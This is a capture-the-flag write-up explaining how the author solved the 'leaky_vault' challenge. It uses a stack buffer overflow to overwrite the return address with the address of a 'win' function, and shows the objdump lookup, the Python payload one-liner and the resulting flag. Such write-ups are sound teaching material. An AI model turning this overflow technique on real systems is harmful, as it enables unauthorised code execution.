Leak-Vault Writeup

This binary challenge requires executing the win function by leveraging a buffer overflow vulnerability and using the function's address.
Steps to Solve
1. Identify the win Function Address

To locate the address of the win function, I used objdump to disassemble the binary and searched for the win function:
bash
Copy

`┌──(myenv)─(zwique㉿kali)-[~/Downloads]
└─$ objdump -d leaky_vault | grep win
000000000040084c <win>:
  400874:       540000c1        b.ne    40088c <win+0x40>  // b.any
`
The address of the win function is 0x40084c.
2. Exploit the Buffer Overflow

The binary appears to have a buffer overflow vulnerability. By providing an input longer than the buffer size, we can overwrite the return address on the stack with the address of the win function.

I crafted a payload consisting of:

    72 bytes of filler (to fill the buffer and overwrite the saved return address).

    The address of the win function (0x40084c) in little-endian format.

The payload was generated using Python

```┌──(zwique㉿kali)-[~/Downloads]
└─$ python3 -c 'print("A" * 72 + "\x4c\x08\x40\x00\x00\x00\x00\x00")' | ./leaky_vault

3. Execute the Exploit

When the payload is passed to the binary, it successfully overwrites the return address and executes the win function:
Copy

Enter your input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
uacCTF{m3m9ry_l2ak_3xpl0it_CS1410}

The flag is: uacCTF{m3m9ry_l2ak_3xpl0it_CS1410}.
```
Alternative: Using an Exploit Script

┌──(zwique㉿kali)-[~/Downloads]
└─$ python3 exp.py

Conclusion

This challenge demonstrates a classic buffer overflow exploit, where overwriting the return address with the address of a desired function (win) leads to successful execution. Understanding memory layout and function addresses is key to solving such problems.
